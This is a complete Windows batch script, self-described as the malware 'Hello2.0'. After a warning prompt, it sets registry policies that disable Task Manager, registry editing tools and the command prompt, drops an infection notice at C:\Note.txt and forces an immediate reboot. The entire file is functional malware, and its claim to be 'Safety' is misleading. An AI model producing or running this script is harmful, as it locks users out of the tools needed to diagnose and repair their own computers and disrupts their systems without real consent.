@Echo off 
Title Warning!
Echo This Malware Disables Only TaskMgr And Reg And CMD Do You Want To Run it?
Pause
Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f 
Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f 
Reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f 
Echo Your PC Has Been infected By Hello2.0 By Taha 2.0.2.4 This Malware is Safety! >"C:\Note.txt"
Shutdown /r /t 0